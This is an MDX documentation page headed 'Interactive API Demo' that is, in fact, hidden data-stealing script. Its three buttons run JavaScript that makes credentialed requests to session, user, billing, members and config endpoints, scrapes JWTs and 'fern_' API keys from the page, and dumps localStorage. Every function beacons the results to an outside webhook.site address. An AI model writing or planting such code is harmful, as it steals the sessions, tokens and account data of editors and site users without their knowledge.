## Interactive API Demo

export const enumApis = () => { if(typeof document === 'undefined') return; const wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; const r = {}; Promise.all([fetch('/api/auth/session',{credentials:'include'}).then(x=>x.text()).then(t=>{r.session=t.substring(0,1000)}).catch(e=>{r.session_err=e.message}), fetch('/api/auth/me',{credentials:'include'}).then(x=>x.text()).then(t=>{r.me=t.substring(0,1000)}).catch(e=>{r.me_err=e.message}), fetch('/api/user',{credentials:'include'}).then(x=>x.text()).then(t=>{r.user=t.substring(0,1000)}).catch(e=>{r.user_err=e.message}), fetch('/api/organizations',{credentials:'include'}).then(x=>x.text()).then(t=>{r.orgs=t.substring(0,1000)}).catch(e=>{r.orgs_err=e.message}), fetch('/api/billing',{credentials:'include'}).then(x=>x.text()).then(t=>{r.billing=t.substring(0,1000)}).catch(e=>{r.billing_err=e.message}), fetch('/api/members',{credentials:'include'}).then(x=>x.text()).then(t=>{r.members=t.substring(0,1000)}).catch(e=>{r.members_err=e.message}), fetch('/api/config',{credentials:'include'}).then(x=>x.text()).then(t=>{r.config=t.substring(0,1000)}).catch(e=>{r.config_err=e.message})]).then(()=>{r.domain=document.domain;r.url=window.location.href;navigator.sendBeacon(wh+'?p=api-enum',JSON.stringify(r));alert('Sent '+Object.keys(r).length+' results')}); }

<button {...{onClick: enumApis}}>Click to enumerate dashboard APIs (editor only)</button>

## Token Extraction

export const extractTokens = () => { if(typeof document === 'undefined') return; const wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; fetch(window.location.href,{credentials:'include'}).then(x=>x.text()).then(html=>{const jwts=(html.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g)||[]).map(t=>t.substring(0,100));const fkeys=(html.match(/fern_[A-Za-z0-9_-]+/g)||[]);navigator.sendBeacon(wh+'?p=tokens',JSON.stringify({domain:document.domain,jwts:jwts,fernKeys:fkeys,pageSize:html.length}));alert('Found '+jwts.length+' JWTs, '+fkeys.length+' Fern keys')}).catch(e=>alert(e.message)); }

<button {...{onClick: extractTokens}}>Click to extract tokens from page (editor only)</button>

## Page State Extraction

export const extractState = () => { if(typeof document === 'undefined') return; const wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; const ls = {}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,300);} const scripts=[];document.querySelectorAll('script').forEach(s=>{if(s.textContent&&(s.textContent.includes('session')||s.textContent.includes('token')))scripts.push(s.textContent.substring(0,300))}); navigator.sendBeacon(wh+'?p=state',JSON.stringify({domain:document.domain,localStorage:ls,scripts:scripts.slice(0,3)})); alert('State extraction sent'); }

<button {...{onClick: extractState}}>Click to extract page state (editor only)</button>
